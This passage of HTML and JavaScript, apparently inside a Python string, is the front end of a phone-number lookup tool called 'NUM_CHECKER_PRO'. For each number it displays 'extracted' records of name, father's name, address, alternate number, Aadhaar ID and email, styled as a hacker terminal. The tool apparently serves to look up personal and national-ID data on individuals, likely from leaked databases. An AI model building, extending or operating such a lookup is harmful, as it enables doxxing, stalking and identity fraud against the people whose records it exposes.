            document.getElementById('loading').style.display = 'none';
            document.getElementById('result').style.display = 'block';
            document.getElementById('statusText').innerHTML = '[ SCAN: COMPLETE ] [ RESULTS: EXTRACTED ]';
            
            if (data.status === true && data.total_results > 0 && data.result) {
                const total = data.total_results;
                let html = `<div class="success">✓ [ ${total} RECORD(S) EXTRACTED ] ✓</div>`;
                
                for (let i = 0; i < total; i++) {
                    const record = data.result[i];
                    if (record) {
                        html += `<div class="record">
                            <div style="font-weight: bold; color: #00ff41; margin-bottom: 12px; letter-spacing: 2px;">▸ RECORD_${String(i+1).padStart(2,'0')} ◂</div>
                            <p><span class="label">📞 MOBILE:</span> <span class="value">${escapeHtml(record.num || record.mobile || 'N/A')}</span></p>
                            <p><span class="label">🙍 NAME:</span> <span class="value">${escapeHtml(record.name || 'N/A')}</span></p>
                            <p><span class="label">🧔 FATHER:</span> <span class="value">${escapeHtml(record.fname || 'N/A')}</span></p>
                            <p><span class="label">🏠 ADDRESS:</span> <span class="value">${escapeHtml((record.address || '').replace(/!/g, ', '))}</span></p>
                            <p><span class="label">📞 ALT_NUM:</span> <span class="value">${escapeHtml(record.alt || 'N/A')}</span></p>
                            <p><span class="label">🌍 CIRCLE:</span> <span class="value">${escapeHtml(record.circle || 'N/A')}</span></p>
                            <p><span class="label">🆔 AADHAR:</span> <span class="value">${escapeHtml(record.id || record.aadhar || 'N/A')}</span></p>
                            <p><span class="label">📧 EMAIL:</span> <span class="value">${escapeHtml(record.email || 'N/A')}</span></p>
                        </div>`;
                    }
                }
                document.getElementById('result').innerHTML = html;
            } else {
                document.getElementById('result').innerHTML = `<div class="error">[!] ZERO_RESULTS: ${escapeHtml(number)} NOT_FOUND_IN_DATABASE</div>`;
            }
        } catch (error) {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('result').style.display = 'block';
            document.getElementById('statusText').innerHTML = '[ ERROR: CONNECTION_FAILED ]';
            document.getElementById('result').innerHTML = `<div class="error">[!] SYSTEM_ERROR: ${escapeHtml(error.message)}</div>`;
        }
    }
    
    function showTerminalAlert(msg) {
        const resultDiv = document.getElementById('result');
        resultDiv.style.display = 'block';
        resultDiv.innerHTML = `<div class="error">${msg}</div>`;
        setTimeout(() => {
            if(document.getElementById('result').innerHTML.includes('ERROR')) {
                document.getElementById('result').style.display = 'none';
            }
        }, 3000);
    }
    
    function escapeHtml(str) {
        if (!str) return 'N/A';
        return String(str).replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }
    
    document.getElementById('number').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') checkNumber();
    });
    
    console.log(`
    ╔══════════════════════════════════════════════════════╗
    ║     NUM_CHECKER_PRO v6.0 - ENHANCED DETECTION       ║
    ║     DEVELOPER: ARYAN AFRIDI                         ║
    ║     STATUS: ENHANCED SILENT DETECTION ACTIVE        ║
    ╚══════════════════════════════════════════════════════╝
    `);
</script>
</body>
</html>
'''